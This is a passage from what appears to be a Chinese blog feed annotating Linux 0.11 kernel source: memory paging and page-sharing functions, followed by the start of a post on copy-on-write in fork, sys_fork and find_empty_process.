class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 275</span></span><br><span class="line"><span class="comment">// 实际通过 get_free_page 与 put_page 实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_empty_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(tmp=get_free_page()) || !put_page(tmp,address)) &#123;</span><br><span class="line">free_page(tmp);</span><br><span class="line">oom();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 63</span></span><br><span class="line"><span class="comment">// PAGING_PAGES 为页面总数，输入为 ax = 0，cx = PAGING_PAGES，</span></span><br><span class="line"><span class="comment">// edi = mem_map+PAGING_PAGES-1（即 mem_map 最后一项的地址）</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_free_page</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __res <span class="title">asm</span><span class="params">(<span class="string">&quot;ax&quot;</span>)</span></span>;</span><br><span class="line"><span class="comment">// std: 置方向位，从高到低</span></span><br><span class="line"><span class="comment">// repne: repeat if not equal，即下一条指令如果不能使 ZF 标志位为 0，则重复该指令，最多 ecx 次</span></span><br><span class="line"><span class="comment">// scasb: scas 用于比较字符串，加个 b 表示一次比较一字符，比较一次，di 自动递减（std 设置了方向）</span></span><br><span class="line"><span class="comment">//    每次操作比较 es:[di] 和 al 是否相等，这里从 mem_map 最后一项开始寻找映射数为 0 的项</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">__asm__(<span class="string">&quot;std ; repne ; scasb\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;jne 1f\n\t&quot;</span><span class="comment">// 如果遍历完 mem_map 还是没有找到空闲页面，则返回</span></span><br><span class="line"><span class="string">&quot;movb $1,1(%%edi)\n\t&quot;</span><span class="comment">// 到这里说明找到了空闲页，将 mem_map 对应项置 1</span></span><br><span class="line"><span class="string">&quot;sall $12,%%ecx\n\t&quot;</span><span class="comment">// 索引 * 4K 得到页面的相对起始地址</span></span><br><span class="line"><span class="string">&quot;addl %2,%%ecx\n\t&quot;</span><span class="comment">// 加上 LOW_MEM 得到页面实际物理起始地址</span></span><br><span class="line"><span class="string">&quot;movl %%ecx,%%edx\n\t&quot;</span><span class="comment">// 起始地址赋给 edi</span></span><br><span class="line"><span class="string">&quot;movl $1024,%%ecx\n\t&quot;</span><span class="comment">// 循环 1024 次</span></span><br><span class="line"><span class="string">&quot;leal 4092(%%edx),%%edi\n\t&quot;</span> <span class="comment">// 当前页面末端 4 字节地址赋给 edi</span></span><br><span class="line"><span class="string">&quot;rep ; stosl\n\t&quot;</span><span class="comment">// stosl 将 eax 中的内容赋值给 es:[edi]</span></span><br><span class="line"><span class="string">&quot;movl %%edx,%%eax\n\t&quot;</span><span class="comment">// 返回值为页面物理起始地址</span></span><br><span class="line"><span class="string">&quot;1:&quot;</span></span><br><span class="line"><span class="string">&quot;cld\n\t&quot;</span><span class="comment">// 复位方向位</span></span><br><span class="line">:<span class="string">&quot;=a&quot;</span> (__res)</span><br><span class="line">:<span class="string">&quot;0&quot;</span> (<span class="number">0</span>),<span class="string">&quot;i&quot;</span> (LOW_MEM),<span class="string">&quot;c&quot;</span> (PAGING_PAGES),</span><br><span class="line"><span class="string">&quot;D&quot;</span> (mem_map+PAGING_PAGES<span class="number">-1</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> __res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 198</span></span><br><span class="line"><span class="comment">// 该函数将内存页面物理地址 page 映射到指定线性地址 address 处</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">put_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> page,<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tmp, *page_table;</span><br><span class="line"><span class="comment">// page 应该在 LOW_MEM 与 HIGH_MEMORY 之间</span></span><br><span class="line"><span class="keyword">if</span> (page &lt; LOW_MEM || page &gt;= HIGH_MEMORY)</span><br><span class="line">printk(<span class="string">&quot;Trying to put page %p at %p\n&quot;</span>,page,address);</span><br><span class="line"><span class="keyword">if</span> (mem_map[(page-LOW_MEM)&gt;&gt;<span class="number">12</span>] != <span class="number">1</span>)<span class="comment">// 检查 page 是否是已经申请的页面</span></span><br><span class="line">printk(<span class="string">&quot;mem_map disagrees with %p at %p\n&quot;</span>,page,address);</span><br><span class="line">page_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) ((address&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>);<span class="comment">// 线性地址对应页目录项指针</span></span><br><span class="line"><span class="keyword">if</span> ((*page_table)&amp;<span class="number">1</span>)<span class="comment">// 如果页目录存在，直接获取页表地址</span></span><br><span class="line">page_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (<span class="number">0xfffff000</span> &amp; *page_table);</span><br><span class="line"><span class="keyword">else</span> &#123;<span class="comment">// 否则申请一空内存页，存放页表</span></span><br><span class="line"><span class="keyword">if</span> (!(tmp=get_free_page()))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">*page_table = tmp|<span class="number">7</span>;<span class="comment">// 设置权限等</span></span><br><span class="line">page_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) tmp;<span class="comment">// 获取页表地址</span></span><br><span class="line">&#125;</span><br><span class="line">page_table[(address&gt;&gt;<span class="number">12</span>) &amp; <span class="number">0x3ff</span>] = page | <span class="number">7</span>;<span class="comment">// 修改线性地址对应的页表项，指向给定的物理地址</span></span><br><span class="line"><span class="keyword">return</span> page;<span class="comment">// 无需刷新 TLB，直接返回</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h3><p>第三类有关<strong>共享内存</strong>，share_page 函数仅被缺页处理函数 do_no_page 调用。这里引入一个新概念——<strong>页面逻辑地址</strong>，意为该页面地址是以进程的代码/数据起始地址算起的页面地址。以下是 do_no_page 部分代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 373</span></span><br><span class="line"><span class="comment">// address 是产生页错误的线性地址</span></span><br><span class="line"><span class="comment">// current-&gt;start_code 是当前进程的线性地址空间基址（64MB 对齐）</span></span><br><span class="line"><span class="comment">// address - current-&gt;start_code 求出地址对应的页面逻辑地址</span></span><br><span class="line">address &amp;= <span class="number">0xfffff000</span>;<span class="comment">// 取得线性地址所在的线性页面的地址</span></span><br><span class="line">tmp = address - current-&gt;start_code;</span><br><span class="line"><span class="keyword">if</span> (share_page(tmp))</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>share_page 的具体实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 345</span></span><br><span class="line"><span class="comment">// 寻找运行相同执行文件的进程，并尝试与之共享页面</span></span><br><span class="line"><span class="comment">// 参数 address 是页面逻辑地址</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">share_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!current-&gt;executable)<span class="comment">// 如果当前进程没有执行文件，则返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 如果当前进程正在执行的文件引用数小于 2，说明只有当前进程在运行该文件，直接返回</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;executable-&gt;i_count &lt; <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) &#123;<span class="comment">// 遍历任务数组</span></span><br><span class="line"><span class="keyword">if</span> (!*p)<span class="comment">// 跳过空任务项</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (current == *p)<span class="comment">// 跳过当前进程</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;executable != current-&gt;executable)<span class="comment">// 跳过与当前进程执行的文件不同的进程</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (try_to_share(address,*p))<span class="comment">// 调用 try_to_share 尝试共享页面</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 293</span></span><br><span class="line"><span class="comment">// 尝试与目标任务 p 共享内存</span></span><br><span class="line"><span class="comment">// address 为产生页错误的线性地址所在的线性页面地址对应的页面逻辑地址（有点绕）</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">try_to_share</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address, struct task_struct * p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> from;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> to;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> from_page;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> to_page;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> phys_addr;</span><br><span class="line"></span><br><span class="line">from_page = to_page = ((address&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>);</span><br><span class="line">from_page += ((p-&gt;start_code&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>);<span class="comment">// 计算进程 p 的 address 对应的页目录项地址</span></span><br><span class="line">to_page += ((current-&gt;start_code&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>);<span class="comment">// 计算当前进程的 address 对应的页目录项地址</span></span><br><span class="line">from = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) from_page;<span class="comment">// 获得进程 p 页目录项</span></span><br><span class="line"><span class="keyword">if</span> (!(from &amp; <span class="number">1</span>))<span class="comment">// 如果进程 p 该页表不存在，返回 0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">from &amp;= <span class="number">0xfffff000</span>;<span class="comment">// 否则取得页表基址</span></span><br><span class="line">from_page = from + ((address&gt;&gt;<span class="number">10</span>) &amp; <span class="number">0xffc</span>);<span class="comment">// 计算页表项地址</span></span><br><span class="line">phys_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) from_page;<span class="comment">// 获得页表项内容</span></span><br><span class="line"><span class="keyword">if</span> ((phys_addr &amp; <span class="number">0x41</span>) != <span class="number">0x01</span>)<span class="comment">// 0x41 对应 dirty 与 P 位，判断页面是否干净且存在</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">phys_addr &amp;= <span class="number">0xfffff000</span>;<span class="comment">// 满足条件取得页面物理地址</span></span><br><span class="line"><span class="keyword">if</span> (phys_addr &gt;= HIGH_MEMORY || phys_addr &lt; LOW_MEM)<span class="comment">// 判断物理地址是否越界</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">to = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) to_page;<span class="comment">// 获得当前进程页目录项</span></span><br><span class="line"><span class="keyword">if</span> (!(to &amp; <span class="number">1</span>))<span class="comment">// 如果当前进程该页表不存在</span></span><br><span class="line"><span class="keyword">if</span> (to = get_free_page())<span class="comment">// 则申请一页内存当页表</span></span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) to_page = to | <span class="number">7</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">oom();</span><br><span class="line">to &amp;= <span class="number">0xfffff000</span>;<span class="comment">// 取得页表基址</span></span><br><span class="line">to_page = to + ((address&gt;&gt;<span class="number">10</span>) &amp; <span class="number">0xffc</span>);<span class="comment">// 计算页表项地址</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &amp; *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) to_page)<span class="comment">// 如果当前进程的该页已有（我们本意是想共享内存），则死机</span></span><br><span class="line">panic(<span class="string">&quot;try_to_share: to_page already exists&quot;</span>);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) from_page &amp;= ~<span class="number">2</span>;<span class="comment">// 取消页的写权限</span></span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) to_page = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) from_page;<span class="comment">// 建立映射</span></span><br><span class="line">invalidate();<span class="comment">// 刷新 TLB</span></span><br><span class="line">phys_addr -= LOW_MEM;</span><br><span class="line">phys_addr &gt;&gt;= <span class="number">12</span>;</span><br><span class="line">mem_map[phys_addr]++;<span class="comment">// 物理地址在 mem_map 数组中对应项的映射数 + 1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>第四类是 main.c 中调用的 mem_init <strong>初始化函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 400</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_init</span><span class="params">(<span class="keyword">long</span> start_mem, <span class="keyword">long</span> end_mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">HIGH_MEMORY = end_mem;<span class="comment">// 设置内存最高地址（16MB）</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;PAGING_PAGES ; i++)<span class="comment">// 将 mem_map 所有项都赋值为 100，表示已占用</span></span><br><span class="line">mem_map[i] = USED;</span><br><span class="line">i = MAP_NR(start_mem);<span class="comment">// 获取主内存开始地址对应的索引</span></span><br><span class="line">end_mem -= start_mem;<span class="comment">// 计算主内存区域大小</span></span><br><span class="line">end_mem &gt;&gt;= <span class="number">12</span>;<span class="comment">// 计算在 mem_map 数组中一共有多少项</span></span><br><span class="line"><span class="keyword">while</span> (end_mem--&gt;<span class="number">0</span>)<span class="comment">// 将 mem_map 从后往前清零</span></span><br><span class="line">mem_map[i++]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>最后是一些杂项：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 262 </span></span><br><span class="line"><span class="comment">// 写页面的验证，address 是页面的线性地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_verify</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> page;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!( (page = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) ((address&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>)) )&amp;<span class="number">1</span>))<span class="comment">// 页表不存在则返回</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">page &amp;= <span class="number">0xfffff000</span>;<span class="comment">// 取得页表基址</span></span><br><span class="line">page += ((address&gt;&gt;<span class="number">10</span>) &amp; <span class="number">0xffc</span>);<span class="comment">// 计算页表项地址</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="number">3</span> &amp; *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *) page) == <span class="number">1</span>)<span class="comment">// 如果对应的页只读、存在</span></span><br><span class="line">un_wp_page((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) page);<span class="comment">// 则执行复制页面、构建新映射的操作</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 414</span></span><br><span class="line"><span class="comment">// 显示当前内存信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_mem</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,k,<span class="built_in">free</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> * pg_tbl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span> ; i&lt;PAGING_PAGES ; i++)</span><br><span class="line"><span class="keyword">if</span> (!mem_map[i]) <span class="built_in">free</span>++;<span class="comment">// 计算主内存区中有多少空闲页面并打印</span></span><br><span class="line">printk(<span class="string">&quot;%d pages free (of %d)\n\r&quot;</span>,<span class="built_in">free</span>,PAGING_PAGES);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">2</span> ; i&lt;<span class="number">1024</span> ; i++) &#123;<span class="comment">// 遍历所有页目录项</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>&amp;pg_dir[i]) &#123;<span class="comment">// 如果对应页表存在</span></span><br><span class="line">pg_tbl=(<span class="keyword">long</span> *) (<span class="number">0xfffff000</span> &amp; pg_dir[i]);<span class="comment">// 获取页表基址</span></span><br><span class="line"><span class="keyword">for</span>(j=k=<span class="number">0</span> ; j&lt;<span class="number">1024</span> ; j++)<span class="comment">//遍历页表项</span></span><br><span class="line"><span class="keyword">if</span> (pg_tbl[j]&amp;<span class="number">1</span>)<span class="comment">// 如果对应物理页存在，计数变量 k 加 1</span></span><br><span class="line">k++;</span><br><span class="line">printk(<span class="string">&quot;Pg-dir[%d] uses %d pages\n&quot;</span>,i,k);<span class="comment">// 打印页目录中有多少正在使用的页</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读-kernel（五）</title>
      <link href="/2020/04/15/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>/2020/04/15/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这一期的主要内容是初探 <strong>写时复制(Copy On Write)</strong> 技术，该技术在 Linux 系统创建子进程时被使用到。众所周知，我们可以通过 fork 函数来创建一个子进程。该子进程可以说是其父进程的一个副本，继承了父进程很多属性，包括代码空间和数据空间</p><h2 id="传统的做法"><a href="#传统的做法" class="headerlink" title="传统的做法"></a>传统的做法</h2><p>考虑最一般的创建子进程的方法，子进程需要将父进程的数据空间等信息拷贝到属于自己的内存空间中去，这样才能保证自己在操作数据（特别是写数据）时不会影响到父进程。所以每次创建新的子进程时都需要进行数据空间（包括数据段、堆栈段）的拷贝，以保证父子进程之间的数据段和堆栈是<strong>相互独立</strong>的。而代码段由于不可写（不会被修改），故没必要拷贝，父子进程共用一块代码空间即可</p><br><h2 id="写时复制的引入"><a href="#写时复制的引入" class="headerlink" title="写时复制的引入"></a>写时复制的引入</h2><p>相信你也发现了这么做的缺点，拷贝数据空间是要花时间的。如果父子进程之后不对数据空间进行写操作（不修改数据），那子进程就没必要再花时间来拷贝父进程的数据了，子进程直接将自己的数据空间映射到父进程的数据空间去，便可大大降低创建进程的代价（尤其对于将执行 exec 系列函数的子进程，这里不进行展开）。</p><p>或许你又会问，CPU 怎么知道父进程/新建的子进程之后会不会对数据空间进行写操作？预测吗？那万一猜错了，实际上进程要写数据又该怎么办？…… 放过 CPU 吧，人家做分支预测都已经忙不过来了，哪还有心情来预测这个</p><p>实际上，Linux 采取了一种折中的方式。fork 创建进程时，先把子进程数据空间映射到父进程的数据空间去，不过需要将<strong>父子进程</strong>对于数据空间的访问权限都修改为<strong>只读</strong>（也有例外，后面代码分析时会提及）。以后如果其中一个进程（父进程或子进程）要写数据了，CPU 把要写入的地址拿来一看，发现地址只读，于是抛出一个页错误的异常，然后去运行异常对应的处理程序。该处理程序就会拷贝触发页错误的内存页到新的内存区域去，并重新建立进程对于该页的映射，使其映射至新创建的”副本”页，最后通知 CPU 重新执行写操作。这就是所谓的写时复制技术，真就是在写的时候才进行复制</p><br><blockquote><p>写时复制的优缺点</p></blockquote><ul><li>优点：减少不必要的资源分配，提高创建进程的效率</li><li>缺点：进程创建完毕后，如果父子进程都还要写数据，将会产生大量页错误</li></ul><br><h2 id="fork-c"><a href="#fork-c" class="headerlink" title="fork.c"></a>fork.c</h2><p>对写时复制技术有个概念之后，再来看其实现细节就会好理解的多了，同样，一些涉及到内存管理的函数现在只需知晓其功能。当在程序中调用 fork 创建子进程时，实际通过系统调用 sys_fork 完成，其定义在system_call.s 中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/* kernel/system_call.s Line 207 */</span><br><span class="line">.align 4</span><br><span class="line">sys_fork:</span><br><span class="line">call find_empty_process</span><br><span class="line">testl %eax,%eax/* 如果返回的任务号是负数，就直接返回 */</span><br><span class="line">js 1f</span><br><span class="line">push %gs</span><br><span class="line">pushl %esi</span><br><span class="line">pushl %edi</span><br><span class="line">pushl %ebp</span><br><span class="line">pushl %eax/* 压参并调用 copy_process */</span><br><span class="line">call copy_process</span><br><span class="line">addl $20,%esp</span><br><span class="line">1:ret</span><br></pre></td></tr></table></figure><p>可以看到一开始就调用了 find_empty_process 来寻找任务数组中没有被使用（空闲）的项，然后压参调用 copy_process 来拷贝一些父进程的属性并设置新进程自身的属性信息。find_empty_process 定义在 fork.c 末尾：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 22</span></span><br><span class="line"><span class="keyword">long</span> last_pid=<span class="number">0</span>;<span class="comment">// 定义为全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 136</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_empty_process</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="comment">// 首先查找空闲的 pid</span></span><br><span class="line">repeat:</span><br><span class="line"><span class="keyword">if</span> ((++last_pid)&lt;<span class="number">0</span>) last_pid=<span class="number">1</span>;<span class="comment">// 选出一个 pid，并防止其超过正数表示范围</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span> ; i&lt;NR_TASKS ; i++)<span class="comment">// 遍历任务数组，如果该 pid 已被使用，则重新选(+1)</span></span><br><span class="line"><span class="keyword">if</span> (task[i] &amp;&amp; task[i]-&gt;pid == last_pid) <span class="keyword">goto</span> repeat;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span> ; i&lt;NR_TASKS ; i++)<span class="comment">// 遍历任务数组，找出未被使用的项</span></span><br><span class="line"><span class="keyword">if</span> (!task[i])</span><br><span class="line"><span class="keyword">return</span> i;<span class="comment">// 返回该空项的索引值（任务号）</span></span><br><span class="line"><span class="keyword">return</span> -EAGAIN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="copy-process"><a href="#copy-process" class="headerlink" title="copy_process"></a>copy_process</h3><p>然后是核心函数 copy_process，从上面 sys_fork 的代码可以看出，在调用之前，还压入了部分参数，这些参数都将用于设置子进程属性。copy_process 函数的参数很多，按照从下往上，从右往左的顺序来看，依次是执行系统调用指令（INT 0x80）时压入的 ss, esp, eflags, cs, eip；system_call 子程序执行时压入的 ds, es, fs, edx, ecx, ebx（system_call.s 83 ~ 88 行）；执行 <code>call sys_call_table(,%eax,4)</code>（system_call.s 第 94 行）调用 sys_fork 时压入的返回地址 none；以及 sys_fork 中压入的 gs, esi, edi, ebp, eax（find_empty_process 函数的返回值，即空闲的任务号 nr）。下面是 copy_process 函数的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 